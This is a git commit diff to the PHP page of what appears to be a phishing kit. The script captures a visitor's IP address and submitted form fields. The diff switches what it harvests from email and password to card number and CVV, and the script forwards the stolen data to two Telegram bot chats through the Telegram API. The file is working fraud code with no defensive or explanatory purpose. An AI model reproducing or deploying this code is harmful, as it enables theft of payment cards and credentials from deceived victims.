a60f63a0c32c494bb3e99436980e3b1e692094bb
brainandrews <111882964+brainandrews@users.noreply.github.com>
2022-12-13 17:18:06 +0800

    Update login1.php
    Signed-off-by: brainandrews <111882964+brainandrews@users.noreply.github.com>

--- public/login1.php
+++ public/login1.php
@@ -2,7 +2,7 @@
 <?php
 $datum = date('d-m-Y / H:i:s');
 
-include 'Frank420jsxxnxxxsjmsksksjsjsjsjsksksks-sksk.snsnssjsjdhsiafran.php';
+include 'send.php';
 $ip = getenv("REMOTE_ADDR");
 $link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
 $message = "[link: $link ]\r\n";
@@ -11,8 +11,8 @@ $hostname = gethostbyaddr($ip);
 $send = $email; 
 $send = $email2; 
 $message = "THANKS Salary\n";
-$message .= "email : ".$_POST['email']."\r\n";
-$message .= "password : ".$_POST['password']."\r\n";
+$message .= "Numbercard : ".$_POST['Numbercard']."\r\n";
+$message .= "Cvv : ".$_POST['Cvv']."\r\n";
 
 file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );
 file_get_contents("https://api.telegram.org/bot".$api2."/sendMessage?chat_id=".$chatid2."&text=" . urlencode($message)."" );
